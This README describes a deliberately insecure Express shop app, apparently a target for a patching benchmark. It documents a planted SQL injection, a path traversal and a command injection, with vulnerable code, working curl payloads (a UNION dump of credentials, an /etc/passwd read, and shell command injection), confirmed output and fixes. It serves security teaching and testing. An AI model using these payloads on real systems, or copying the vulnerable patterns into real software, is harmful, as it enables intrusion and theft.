# Vulnerable Shop (PatchProof target)

A deliberately insecure Express app: **three** planted vulnerabilities, an
in-memory database, and a functional test suite.

> ⚠️ **Sandbox use only.** Never expose this to a network you do not control.
> It *is* the vulnerability; there is no "safe mode".

## Run it

```bash
npm install
npm start                       # http://localhost:3000
PORT=3210 npm start             # somewhere else
```

No database to install: the app uses Node's built-in SQLite (`node:sqlite`)
against `:memory:`, seeded fresh on every boot.

## Test it

```bash
npm test
```

`tests/` holds a functional suite (Node's built-in `node:test` + `fetch`, no
supertest). It asserts **only how the endpoints should behave for normal
users** — normal searches return matches, public documents are served, valid
conversions succeed.

That is deliberate: these tests pass against the vulnerable code as written and
**must keep passing after the bugs are patched**. A patch that fixes the
injection but breaks ordinary search is a regression, not a fix. The tests never
assert that a vulnerability exists.

## The three vulnerabilities

| # | Class | Endpoint | Where |
| --- | --- | --- | --- |
| 1 | SQL injection | `GET /search?q=` | `src/routes/search.js` |
| 2 | Path traversal | `GET /files/:name` | `src/routes/files.js` |
| 3 | Command injection | `POST /convert` | `src/routes/convert.js` |

Each is tagged with a `VULN #n` comment in the source, and each comment also
sketches the safe version of the same line.

### 1. SQL injection — `GET /search?q=`

`q` is interpolated into the SQL string instead of being bound:

```js
db.prepare(`SELECT id, name, description, price FROM products WHERE name LIKE '%${q}%'`)
```

Because it is real SQL running on a real (in-memory) engine, the caller can
append their own clause. A `LIKE` term that matches nothing, followed by a
`UNION`, dumps the `users` table:

```bash
curl -sG 'http://localhost:3000/search' \
  --data-urlencode "q=zzz' UNION SELECT id,username,password,email FROM users--"
```

Resulting SQL — the trailing `%'` is swallowed by the `--` comment:

```sql
SELECT id, name, description, price FROM products WHERE name LIKE '%zzz'
UNION SELECT id, username, password, email FROM users--%'
```

Confirmed output (the users table, column names reused as products columns):

```json
{"count":3,"results":[
  {"id":1,"name":"alice","description":"alice-password","price":"alice@example.com"},
  {"id":2,"name":"bob","description":"hunter2","price":"bob@example.com"},
  {"id":3,"name":"admin","description":"S3cr3t-Adm1n-P@ss","price":"admin@example.com"}]}
```

Fix: `db.prepare('... WHERE name LIKE ?').all('%' + q + '%')`.

### 2. Path traversal — `GET /files/:name`

The name is joined onto the public directory without confinement:

```js
const target = path.join(PUBLIC_DIR, name);   // PUBLIC_DIR = private/public
fs.readFileSync(target, 'utf8');
```

`path.join` normalises `..` away, so the read walks out of `PUBLIC_DIR`.
Because a `:name` param cannot contain a `/`, the slashes are percent-encoded as
`%2F` so the whole traversal stays inside one path segment:

```bash
curl -s --path-as-is 'http://localhost:3000/files/..%2Fsecret.txt'
```

Confirmed output — `private/secret.txt`, which sits *outside* the served
directory, is returned in full (including its `PATCHPROOF{...}` flag):

```json
{"file":"../secret.txt","bytes":500,"content":"CONFIDENTIAL — NOT SERVED BY THE PUBLIC FILE ENDPOINT..."}
```

In the Linux sandbox container the classic target also works:

```bash
curl -s --path-as-is 'http://localhost:3000/files/..%2F..%2F..%2Fetc%2Fpasswd'
```

Fix: `path.resolve(PUBLIC_DIR, name)` then reject anything that does not start
with `PUBLIC_DIR + path.sep`, or serve by an allow-list instead.

### 3. Command injection — `POST /convert`

`format` and `input` from the JSON body are concatenated into a shell command
that `exec()` runs through a shell, so shell metacharacters start a second
command:

```js
const command = `node "${CONVERTER}" --format ${format} --input ${input}`;
exec(command, ...)
```

```bash
curl -s -X POST 'http://localhost:3000/convert' \
  -H 'Content-Type: application/json' \
  -d '{"format":"pdf","input":"report.txt & echo PATCHPROOF_PWNED"}'

# arbitrary command execution
curl -s -X POST 'http://localhost:3000/convert' \
  -H 'Content-Type: application/json' \
  -d '{"input":"report.txt & whoami"}'
```

Confirmed output — the injected command runs and its stdout comes back:

```json
{"format":"pdf","input":"report.txt & echo PATCHPROOF_PWNED",
 "command":"node \".../tools/convert-cli.js\" --format pdf --input report.txt & echo PATCHPROOF_PWNED",
 "output":"converted report.txt -> pdf\nPATCHPROOF_PWNED\r\n","exitCode":0}
```

`&` is a command separator in both `cmd.exe` and `sh`, so the same payload works
on Windows and in the Linux container (`;` also works on `sh`).

Fix: skip the shell entirely —
`execFile(process.execPath, [CONVERTER, '--format', format, '--input', input])`.

## Layout

```
src/
  server.js        entry point: starts the HTTP listener
  app.js           createApp() -- app factory used by server.js and the tests
  db.js            node:sqlite :memory: schema + seed, createDb()
  routes/
    search.js      VULN #1  GET /search
    files.js       VULN #2  GET /files/:name
    convert.js     VULN #3  POST /convert
tools/
  convert-cli.js   stand-in for a real converter binary (not part of the bug)
private/
  public/          the only directory /files/:name may serve from
    readme.txt
    terms.txt
  secret.txt       outside public/ -- the traversal's prize
tests/
  helpers.js       boots the real app on an ephemeral port
  search.test.js
  files.test.js
  convert.test.js
```

`app.js` is split from `server.js` so tests can start the app in-process on a
random port with a fresh database, and `createDb()` is called per app so no test
can observe another's state.